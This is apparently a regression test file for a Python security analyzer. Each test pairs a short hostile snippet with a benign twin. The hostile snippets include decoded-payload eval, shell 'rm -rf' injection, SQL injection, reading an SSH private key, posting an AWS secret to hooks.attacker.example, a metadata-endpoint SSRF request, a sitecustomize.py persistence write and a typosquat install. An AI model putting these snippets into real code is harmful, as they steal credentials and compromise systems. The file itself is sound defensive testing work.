"""Regression tests for the Python AST analyzer. All snippets are synthetic
(never copied from the dev set); each malicious case has a benign twin."""
from engine.pipeline import analyze, evaluate


def cats(code):
    return set(evaluate(code)["categories"])


def blocked(code):
    return evaluate(code)["verdict"] == "block"


def rules(code):
    return {f.rule for f in analyze(code).findings}


# ---- obfuscated execution: decoded payload into exec
def test_exec_decoded_blocks():
    code = "import base64\nblob = base64.b64decode('cID0IDE=')\neval(blob)\n"
    assert blocked(code) and "obfuscated_execution" in cats(code)


def test_literal_eval_is_safe():
    code = "import ast\ncfg = ast.literal_eval('{\"a\": 1}')\nprint(cfg)\n"
    assert not blocked(code)


def test_dynamic_import_built_name_blocks():
    code = "def go(spec):\n    mod = __import__('sub' + 'process')\n    return mod.run(spec)\n"
    assert blocked(code) and "obfuscated_execution" in cats(code)


def test_plain_import_is_safe():
    code = "import json\ndata = json.loads('{}')\nprint(data)\n"
    assert not blocked(code)


# ---- aliased os.system with dynamic command
def test_aliased_os_system_dynamic_blocks():
    code = ("def run(choice, fallback):\n"
            "    import os as o\n"
            "    table = {'a': 'id'}\n"
            "    cmd = table.get(choice, fallback)\n"
            "    return o.system(cmd)\n")
    assert blocked(code)


def test_os_system_constant_is_mild():
    code = "import os\nos.system('echo hello world')\n"
    assert not blocked(code)


# ---- deserialization
def test_pickle_loads_blocks():
    code = "import pickle\ndef load(b):\n    return pickle.loads(b)\n"
    r = rules(code)
    assert "py.deserialize" in r


def test_yaml_safe_load_is_safe():
    code = "import yaml\ncfg = yaml.safe_load(open('c.yaml').read())\nprint(cfg)\n"
    assert not blocked(code)


# ---- shell / command injection
def test_subprocess_shell_injection_blocks():
    code = ("import subprocess\n"
            "def deploy(path):\n"
            "    subprocess.run('rm -rf ' + path, shell=True)\n")
    assert blocked(code) and "destructive_command" in cats(code)


def test_subprocess_list_constant_is_safe():
    code = "import subprocess\nsubprocess.run(['ls', '-la', '/tmp'])\n"
    assert not blocked(code)


# ---- SQL injection via % and .format through a variable
def test_sql_percent_format_select_blocks():
    code = ("def search(cur, name):\n"
            "    q = \"SELECT * FROM users WHERE name = '%s'\" % name\n"
            "    cur.execute(q)\n")
    assert blocked(code)


def test_sql_format_delete_blocks():
    code = ("def cancel(cur, oid):\n"
            "    q = 'DELETE FROM orders WHERE id = {}'.format(oid)\n"
            "    cur.execute(q)\n")
    assert blocked(code) and "destructive_command" in cats(code)


def test_parameterized_sql_is_safe():
    code = ("def search(cur, name):\n"
            "    cur.execute('SELECT * FROM users WHERE name = ?', (name,))\n")
    assert not blocked(code)


# ---- secrets and exfiltration
def test_read_ssh_key_blocks():
    code = "def leak():\n    return open('/home/user/.ssh/id_rsa').read()\n"
    assert blocked(code) and "secret_access" in cats(code)


def test_read_own_config_is_safe():
    code = "def prefs():\n    return open('/home/user/.config/app/prefs.json').read()\n"
    assert not blocked(code)


def test_env_secret_to_webhook_blocks():
    code = ("import os, requests\n"
            "def send():\n"
            "    tok = os.getenv('AWS_SECRET_ACCESS_KEY')\n"
            "    requests.post('https://hooks.attacker.example/x', json={'t': tok})\n")
    assert blocked(code) and "data_exfiltration" in cats(code)


# ---- SSRF metadata endpoint
def test_ssrf_metadata_blocks():
    code = ("import requests\n"
            "def role():\n"
            "    return requests.get('http://169.254.169.254/latest/meta-data/').text\n")
    assert blocked(code) and "ssrf_network_exfil" in cats(code)


def test_request_to_public_api_is_safe():
    code = "import requests\nrequests.get('https://api.example.com/v1/status')\n"
    assert not blocked(code)


# ---- persistence: Black October startup-hook technique
def test_startup_hook_write_blocks():
    code = ("def setup(sp):\n"
            "    with open(sp + '/site-packages/sitecustomize.py', 'w') as f:\n"
            "        f.write('import os')\n")
    assert blocked(code) and "persistence_or_privesc" in cats(code)


def test_write_normal_file_is_safe():
    code = "def save(d):\n    with open('/tmp/out.txt', 'w') as f:\n        f.write(d)\n"
    assert not blocked(code)


# ---- dependency typosquat
def test_typosquat_install_blocks():
    code = "import subprocess\nsubprocess.run(['pip', 'install', 'colourama'])\n"
    assert blocked(code) and "dependency_risk" in cats(code)


def test_legit_install_is_safe():
    code = "import subprocess\nsubprocess.run(['pip', 'install', 'requests'])\n"
    assert not blocked(code)


def test_compromised_version_flagged():
    code = "import subprocess\nsubprocess.run(['pip', 'install', 'litellm==1.107.0'])\n"
    assert blocked(code) and "dependency_risk" in cats(code)


# ---- resource exhaustion
def test_large_socket_loop_blocks():
    code = ("import socket\n"
            "def flood():\n"
            "    [socket.socket().connect(('localhost', 80)) for _ in range(50000)]\n")
    assert blocked(code) and "resource_exhaustion" in cats(code)


def test_bounded_thread_pool_is_safe():
    code = ("import threading\n"
            "def run(items):\n"
            "    ts = [threading.Thread(target=print, args=(i,)) for i in items[:8]]\n"
            "    for t in ts:\n        t.start()\n")
    assert not blocked(code)


def test_infinite_busy_loop_blocks():
    code = "def spin():\n    while True:\n        pass\n"
    assert blocked(code) and "resource_exhaustion" in cats(code)


# ---- f-string SQL injection built through a variable (regression: str_consts pollution)
def test_fstring_sql_injection_via_variable_blocks():
    code = ("def find(cursor, username):\n"
            "    query = f\"SELECT * FROM customers WHERE username = '{username}'\"\n"
            "    cursor.execute(query)\n")
    assert blocked(code) and "data_exfiltration" in cats(code)


def test_fstring_constant_sql_is_safe():
    code = ("def count(cursor):\n"
            "    table = 'orders'\n"
            "    query = f'SELECT count(*) FROM {table}'\n"
            "    cursor.execute(query)\n")
    assert not blocked(code)


# ---- language detection: Python wrapping SQL in a string must stay Python (not SQL)
def test_python_with_sql_string_detected_as_python():
    from engine.detector import detect_language
    code = "q = f\"SELECT * FROM u WHERE n='{name}'\"\ncur.execute(q)"
    assert detect_language(code)[0] == "python"
    assert blocked(code)  # and the SQL-injection is caught
